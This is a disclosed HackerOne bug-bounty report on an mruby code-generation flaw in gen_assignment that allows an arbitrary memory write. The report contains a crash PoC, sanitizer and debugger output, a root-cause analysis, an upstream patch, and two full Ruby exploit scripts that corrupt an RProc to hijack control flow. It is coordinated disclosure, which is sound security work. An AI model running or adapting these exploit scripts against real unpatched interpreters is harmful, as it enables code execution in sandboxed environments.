{"id":226200,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjYyMDA=","url":"https://hackerone.com/reports/226200","title":"OP_SCALL in LHS of a OP_ASGN resulting in arbitrary memory write","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2017-05-04T21:23:52.791Z","submitted_at":"2017-05-04T21:23:52.791Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"avisaven","url":"/avisaven","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-05-30T14:36:40.301Z","bug_reporter_agreed_on_going_public_at":"2017-05-30T02:25:36.551Z","team_member_agreed_on_going_public_at":"2017-05-30T14:36:40.245Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# PoC\n\n\tx = 0x4242422a\n\ta = *(_\u0026.__=0)\n\ta = *(_\u0026.__=0)\n    \n# Generated Opcodes\n\tirep 0x60c000014440 nregs=5 nlocals=3 pools=1 syms=0 reps=0\n\tfile: crashes/b.rb\n\t    3 000 OP_LOADL\tR1\tL(0)\t; 1111638570\t; R1:x\n\t    4 001 OP_ARRAY\tR3\tR3\t0\n\t    4 002 OP_LOADI\tR4\t0\n\t    4 003 OP_ARYCAT\tR2\tR3\t\t; R2:a\n\t    5 004 OP_ARRAY\tR2\tR2\t0\t; R2:a R2:a\n\t    5 005 OP_LOADI\tR3\t0\n\t    5 006 OP_ARYCAT\tR1\tR2\t\t; R1:x R2:a\n\t    5 007 OP_MOVE\tR2\tR1\t\t; R2:a R1:x\n\t    5 008 OP_STOP\n\n# AddressSanitizer\n\n    unknown lhs 30\n    unknown lhs 30\n    ASAN:SIGSEGV\n    =================================================================\n    ==17426==ERROR: AddressSanitizer: SEGV on unknown address 0x000042424242 (pc 0x00010e982109 bp 0x7fff5127b430 sp 0x7fff5127b350 T0)\n        #0 0x10e982108 in ary_concat array.c:265\n        #1 0x10e981faf in mrb_ary_concat array.c:284\n        #2 0x10eb9d788 in mrb_vm_exec vm.c:2404\n        #3 0x10eb71298 in mrb_vm_run vm.c:860\n        #4 0x10ebaea21 in mrb_top_run vm.c:2733\n        #5 0x10ecc118a in mrb_load_exec parse.y:5780\n        #6 0x10ecc1ef1 in mrb_load_file_cxt parse.y:5789\n        #7 0x10e97cdfc in main mruby.c:227\n        #8 0x7fff8f70d5c8 in start (/usr/lib/system/libdyld.dylib+0x35c8)\n        #9 0x1  (\u003cunknown module\u003e)\n\n    AddressSanitizer can not provide additional info.\n    SUMMARY: AddressSanitizer: SEGV array.c:265 ary_concat\n    ==17426==ABORTING\n    [2]    17426 abort      ./mruby/bin/mruby crashes/b.rb\n\n# Analysis\nIn `gen_assignment`, `return;` is used for the `default` case when doing the code generation (line 1029 in mrbgems/mruby-compiler/core/codegen.c). When the LHS is an `NODE_SCALL` it goes to the base case. It returns and never gets to the bottom line `if (val) push(val);` which is necessary for the rest of the code to use the correct register. Because it is not pushed, it uses the register below it in the stack, which allows us to manipulate arguments in an unchecked manner to other opcodes.\n\nIf this is used in conjunction with `OP_ARYCAT` from the splat operator, one could point the destination of OP_ARYCAT to a fake RArray with any arbitrary memory as the ptr, resulting in a memory write (I'm currently experimenting with this to corrupt strings and get code execution). \n\n# Solution\nIn order to fix this, either having the error for improper LHS code generation should either be fatal and kill the program, or switching `return;` to `break;` will fix the error. However, in the future, there should be some level of verification the the destination of `OP_ARYCAT` is actually an RArray to prevent it being used in memory corruptions.\n\n# Versions Affected\n\nThe code above was tested on the latest master. The bug itself appears to have been created in commit `88cd807379152ea3fec5f534e5f4d6ebebd53982`.","bounty_amount":"200.0","formatted_bounty":"$200","weakness":{"id":6,"name":"Write-what-where Condition"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-06-29T02:25:36.609Z","allow_singular_disclosure_after":-135258195.27062285,"singular_disclosure_allowed":true,"vote_count":3,"voters":["eveeez","0xspade","spetr0x"],"severity":{"rating":"critical","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1655217,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!","automated_response":true,"created_at":"2017-05-04T21:23:52.923Z","updated_at":"2017-05-04T21:23:52.923Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1657844,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Attached below is a PoC that gets code execution\n\n    # Setting up our helper functions.  Inspiration and a few code snippets taken\n    # from the lovely write-up by isra17 at https://hackerone.com/reports/181321 :)\n\n    def hexchartonum(h)\n      numbase = \"0\".getbyte(0)\n      letterbase = \"a\".getbyte(0)\n      if h \u003c (numbase + 10)\n        return h - numbase\n      else\n        return h - letterbase + 10\n      end\n    end\n\n    def numtohexchar(b)\n      numbase = \"0\".getbyte(0)\n      letterbase = \"a\".getbyte(0)\n      if b \u003c 10\n        return b + numbase\n      else\n        return b - 10 + letterbase\n      end\n    end\n\n    def hextobytes(h)\n      p = \"\\x00\"*6\n      6.times do |i|\n        idx = i*2\n        b = hexchartonum(h.getbyte(idx))\n        b *= 16\n        b += hexchartonum(h.getbyte(idx + 1))\n        p.setbyte(5-i,b)\n      end\n      return p\n    end\n\n    def bytestoint(p)\n      n = 0\n      4.times do |i|\n        n += p.getbyte(i) * (256**i)\n      end\n      return n\n    end\n\n    def inttobytes(n)\n      p = \"\\x00\"*4\n      4.times do |i|\n        b = n% 256\n        p.setbyte(i,b)\n        n = n/256\n      end\n      return p\n    end\n\n    def write(s, b, o=0)\n      b.bytesize.times{|i|s.setbyte(o+i, b.getbyte(i))}\n    end\n\n    def addtostr(str, n)\n      str = str.dup\n      write(str, inttobytes(bytestoint(str.slice(0,4))+n))\n      return str\n    end\n\n    # This is the heart of the exploit - our \"clunky\" write primitive.\n    def w(addr, value)\n      # This string is just small enough for its entire contents to be embedded\n      # in the RString.  This is good, since it gives us basically complete control\n      # over the RString's contents.\n      #\n      # We use this complete control to impersonate an RArray.\n      # We start out with zeroes to make sure the length of the \"RArray\" is 0,\n      # and then use large numbers for 'capa' to ensure that it won't try to realloc.\n      # This string perfectly impersonates an RArray with length 0, large capa, and\n      # ptr set to `addr`, which is perfect for concatenating our data into.\n      x = \"\\x00\\x00\\x00\\x00AAAAAAAAAAAA#{addr}\"\n      # Here's the kicker.  We load our fake RArray into R2, then we initiate an\n      # array constructor.\n      #\n      # Under ordinary circumstances, an array literal will push the elements of the\n      # array onto the stack one at a time, then construct the array from the elements\n      # all at once.\n      #\n      # However, if you splat another array into an array literal, the array literal\n      # construction will \"cut off\".  It will construct a temporary array to hold\n      # the items collected so far, then it will add further elements using ARYCAT\n      # for splats and ARYPUSH otherwise.\n      #\n      # However, when, in place of a value, we use an assignment with unknown lhs,\n      # such as `_\u0026.__=0x34343434`, this causes the stack to fail to get pushed.\n      # Two things happen as a result of the stack being one less than it should be.\n      #\n      # 1. Instead of containing [_\u0026.__=0x34343434,value], the inner array is actually\n      # created using the temporary array that it was intending to concatenate onto.\n      # As a result, the inner array is generated containing [[], value].\n      #\n      # 2. Instead of being concatenated onto the temporary array, the inner array\n      # is concatenated directly onto R2, i.e. `a`, which is currently holding our\n      # RString impersonating an RArray.  Oops ;)\n      a=x\n      a = [*([_\u0026.__=0x34343434,value])]\n    end\n\n    $overwritestr = \"This string is long enough to not be counted as an embed.\"\n    # By modifying the string after creating it, we disable the sharing flag.\n    $overwritestr.setbyte(0,41)\n\n    # Now we want to locate the address of a string.  We'll do so by taking the\n    # absolute address of this proc and computing an offset using the object_id\n    # method.  This will also handily set up a proc for us to corrupt later.\n    $proc = Proc.new{|a|a*2}\n    $procid = $proc.object_id^13\n    $strid = $overwritestr.object_id^16\n    $diff = $strid - $procid\n    $prochexaddr = $proc.to_s.byteslice(9,12)\n    $procaddr = hextobytes($prochexaddr)\n    $straddr = addtostr($procaddr, $diff)\n\n    # Now we use our \"clunky\" write primitive to corrupt the string.  We write in\n    # this way to put the address of proc in exactly the RString 'ptr' field.\n    # However, our write primitive is \"clunky\", so it cannot write anything user-controlled\n    # without writing some garbage first, and, at best, we can only control every\n    # other 8 bytes.  It just so happens that the layout of data in an empty array\n    # and the layout of the RString struct are helpfully organized so that we can\n    # get a good number in the len field and also write to the ptr field without\n    # corrupting too much other data.\n    w(addtostr($straddr,24),$proc)\n\n    # After corrupting $overwritestr, its ptr is now equal to the address of the\n    # RProc structure. We can now freely use setbyte() calls on the str to modify\n    # the RProc with perfect precision.\n    write($overwritestr, \"\\xFF\\xFF\",1) # Setting all flags to make it a CFunc\n    write($overwritestr, \"AAAAAAAA\", 24) # The address to call\n\n    $proc.call # Winner winner chicken dinner :)\n\nGDB analysis:\n\n\tProcess 25597 stopped\n\t* thread #1: tid = 0xa1bdd, 0x0000000100205c34 mruby`mrb_vm_exec(mrb=0x000061400000fe40, proc=0x000062f00000a480, pc=0x00000001003d93c0) + 58884 at vm.c:1390, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=EXC_I386_GPFLT)\n\t    frame #0: 0x0000000100205c34 mruby`mrb_vm_exec(mrb=0x000061400000fe40, proc=0x000062f00000a480, pc=0x00000001003d93c0) + 58884 at vm.c:1390\n\t   1387\n\t   1388\t      /* prepare stack */\n\t   1389\t      if (MRB_PROC_CFUNC_P(m)) {\n\t-\u003e 1390\t        recv = m-\u003ebody.func(mrb, recv);\n\t   1391\t        mrb_gc_arena_restore(mrb, ai);\n\t   1392\t        if (mrb-\u003eexc) goto L_RAISE;\n\t   1393\t        /* pop stackpos */\n\t(lldb) print m-\u003ebody.func\n\t(mrb_func_t) $1 = 0x4141414141414141","automated_response":false,"created_at":"2017-05-06T05:00:20.016Z","updated_at":"2017-05-06T05:00:20.016Z","actor":{"username":"avisaven","cleared":false,"url":"/avisaven","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1657846,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here's a patch to fix the bug\n\n    diff --git a/mrbgems/mruby-compiler/core/codegen.c b/mrbgems/mruby-compiler/core/codegen.c\n    index f863ef33..d04ff44b 100644\n    --- a/mrbgems/mruby-compiler/core/codegen.c\n    +++ b/mrbgems/mruby-compiler/core/codegen.c\n    @@ -1026,7 +1026,7 @@ gen_assignment(codegen_scope *s, node *tree, int sp, int val)\n     #ifndef MRB_DISABLE_STDIO\n         fprintf(stderr, \"unknown lhs %d\\n\", type);\n     #endif\n    -    return;\n    +    break;\n       }\n       if (val) push();\n     }\n","automated_response":false,"created_at":"2017-05-06T05:09:10.430Z","updated_at":"2017-05-06T05:09:10.430Z","actor":{"username":"avisaven","cleared":false,"url":"/avisaven","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1659149,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"If you are having trouble executing the above PoC, on some compilers the .to_s method for Procs works differently. This version of the PoC should fix that:\n\n\t# Setting up our helper functions.  Inspiration and a few code snippets taken\n\t# from the lovely write-up by isra17 at https://hackerone.com/reports/181321 :)\n\n\tdef hexchartonum(h)\n\t  numbase = \"0\".getbyte(0)\n\t  letterbase = \"a\".getbyte(0)\n\t  if h \u003c (numbase + 10)\n\t    return h - numbase\n\t  else\n\t    return h - letterbase + 10\n\t  end\n\tend\n\n\tdef numtohexchar(b)\n\t  numbase = \"0\".getbyte(0)\n\t  letterbase = \"a\".getbyte(0)\n\t  if b \u003c 10\n\t    return b + numbase\n\t  else\n\t    return b - 10 + letterbase\n\t  end\n\tend\n\n\tdef hextobytes(h)\n\t  p = \"\\x00\"*6\n\t  6.times do |i|\n\t    idx = i*2\n\t    b = hexchartonum(h.getbyte(idx))\n\t    b *= 16\n\t    b += hexchartonum(h.getbyte(idx + 1))\n\t    p.setbyte(5-i,b)\n\t  end\n\t  return p\n\tend\n\n\tdef bytestoint(p)\n\t  n = 0\n\t  4.times do |i|\n\t    n += p.getbyte(i) * (256**i)\n\t  end\n\t  return n\n\tend\n\n\tdef inttobytes(n)\n\t  p = \"\\x00\"*4\n\t  4.times do |i|\n\t    b = n% 256\n\t    p.setbyte(i,b)\n\t    n = n/256\n\t  end\n\t  return p\n\tend\n\n\tdef write(s, b, o=0)\n\t  b.bytesize.times{|i|s.setbyte(o+i, b.getbyte(i))}\n\tend\n\n\tdef addtostr(str, n)\n\t  str = str.dup\n\t  write(str, inttobytes(bytestoint(str.slice(0,4))+n))\n\t  return str\n\tend\n\n\t# Parse a Proc's .to_s() and add leading zeroes.\n\tdef parseProcStr(s)\n\t  start = 9\n\t  finish = s.index('@')\n\t  slice = s.byteslice(start, finish-start)\n\t  addr = \"0\"*12\n\t  write(addr, slice, 12-slice.length)\n\t  return addr\n\tend\n\n\t# This is the heart of the exploit - our \"clunky\" write primitive.\n\tdef w(addr, value)\n\t  # This string is just small enough for its entire contents to be embedded\n\t  # in the RString.  This is good, since it gives us basically complete control\n\t  # over the RString's contents.\n\t  #\n\t  # We use this complete control to impersonate an RArray.\n\t  # We start out with zeroes to make sure the length of the \"RArray\" is 0,\n\t  # and then use large numbers for 'capa' to ensure that it won't try to realloc.\n\t  # This string perfectly impersonates an RArray with length 0, large capa, and\n\t  # ptr set to `addr`, which is perfect for concatenating our data into.\n\t  x = \"\\x00\\x00\\x00\\x00AAAAAAAAAAAA#{addr}\"\n\t  # Here's the kicker.  We load our fake RArray into R2, then we initiate an\n\t  # array constructor.\n\t  #\n\t  # Under ordinary circumstances, an array literal will push the elements of the\n\t  # array onto the stack one at a time, then construct the array from the elements\n\t  # all at once.\n\t  #\n\t  # However, if you splat another array into an array literal, the array literal\n\t  # construction will \"cut off\".  It will construct a temporary array to hold\n\t  # the items collected so far, then it will add further elements using ARYCAT\n\t  # for splats and ARYPUSH otherwise.\n\t  #\n\t  # However, when, in place of a value, we use an assignment with unknown lhs,\n\t  # such as `_\u0026.__=0x34343434`, this causes the stack to fail to get pushed.\n\t  # Two things happen as a result of the stack being one less than it should be.\n\t  #\n\t  # 1. Instead of containing [_\u0026.__=0x34343434,value], the inner array is actually\n\t  # created using the temporary array that it was intending to concatenate onto.\n\t  # As a result, the inner array is generated containing [[], value].\n\t  #\n\t  # 2. Instead of being concatenated onto the temporary array, the inner array\n\t  # is concatenated directly onto R2, i.e. `a`, which is currently holding our\n\t  # RString impersonating an RArray.  Oops ;)\n\t  a=x\n\t  a = [*([_\u0026.__=0x34343434,value])]\n\tend\n\n\t$overwritestr = \"This string is long enough to not be counted as an embed.\"\n\t# By modifying the string after creating it, we disable the sharing flag.\n\t$overwritestr.setbyte(0,41)\n\n\t# Now we want to locate the address of a string.  We'll do so by taking the\n\t# absolute address of this proc and computing an offset using the object_id\n\t# method.  This will also handily set up a proc for us to corrupt later.\n\t$proc = Proc.new{|a|a*2}\n\t$procid = $proc.object_id^13\n\t$strid = $overwritestr.object_id^16\n\t$diff = $strid - $procid\n\t$prochexaddr = parseProcStr($proc.to_s)\n\t$procaddr = hextobytes($prochexaddr)\n\t$straddr = addtostr($procaddr, $diff)\n\n\t# Now we use our \"clunky\" write primitive to corrupt the string.  We write in\n\t# this way to put the address of proc in exactly the RString 'ptr' field.\n\t# However, our write primitive is \"clunky\", so it cannot write anything user-controlled\n\t# without writing some garbage first, and, at best, we can only control every\n\t# other 8 bytes.  It just so happens that the layout of data in an empty array\n\t# and the layout of the RString struct are helpfully organized so that we can\n\t# get a good number in the len field and also write to the ptr field without\n\t# corrupting too much other data.\n\tw(addtostr($straddr,24),$proc)\n\n\t# After corrupting $overwritestr, its ptr is now equal to the address of the\n\t# RProc structure. We can now freely use setbyte() calls on the str to modify\n\t# the RProc with perfect precision.\n\twrite($overwritestr, \"\\xFF\\xFF\",1) # Setting all flags to make it a CFunc\n\twrite($overwritestr, \"AAAAAAAA\", 24) # The address to call\n\n\t$proc.call # Winner winner chicken dinner :)\n","automated_response":false,"created_at":"2017-05-07T16:57:38.001Z","updated_at":"2017-05-07T16:57:38.001Z","actor":{"username":"avisaven","cleared":false,"url":"/avisaven","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1664240,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. This issue was reported by a number of researchers before you, and we opened the following report upstream: https://github.com/mruby/mruby/issues/3642\n\nNormally we would consider your report to be a duplicate, however you were the first researcher to have investigated the cause of the issue and proposed a solution, so we will consider splitting the reward with you once the issue is resolved.","automated_response":false,"created_at":"2017-05-09T19:45:26.717Z","updated_at":"2017-05-09T19:45:26.717Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1674297,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report. Your suggested patch was accepted upstream in https://github.com/mruby/mruby/pull/3656. Our next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon.","automated_response":false,"created_at":"2017-05-15T13:36:21.650Z","updated_at":"2017-05-15T13:36:21.650Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"avisaven","url":"/avisaven"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1708038,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify!","automated_response":false,"created_at":"2017-05-29T19:24:04.844Z","updated_at":"2017-05-29T19:24:04.844Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"200.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"avisaven","url":"/avisaven"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1708439,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-05-30T02:25:36.577Z","updated_at":"2017-05-30T02:25:36.577Z","first_to_agree":true,"actor":{"username":"avisaven","cleared":false,"url":"/avisaven","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1709650,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-05-30T14:36:40.264Z","updated_at":"2017-05-30T14:36:40.264Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1709651,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-05-30T14:36:40.320Z","updated_at":"2017-05-30T14:36:40.320Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1709669,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Awesome! Thanks so much for everything!","automated_response":false,"created_at":"2017-05-30T14:38:30.557Z","updated_at":"2017-05-30T14:38:30.557Z","actor":{"username":"avisaven","cleared":false,"url":"/avisaven","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":3988,"category":"researcher","content":"Improper code generation and error handling in OP_ASGN leads to arbitrary memory write and code execution.","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":164426,"username":"avisaven","name":"Avi Saven","bio":"","cleared":false,"website":"http://www.avisaven.me","location":"New York","created_at":"2017-05-01T21:04:59.435Z","url":"https://hackerone.com/avisaven","anc_triager":false,"hackerone_triager":false,"hackerone_employee":null,"user_type":"hacker","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","xtralarge":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"}}}]}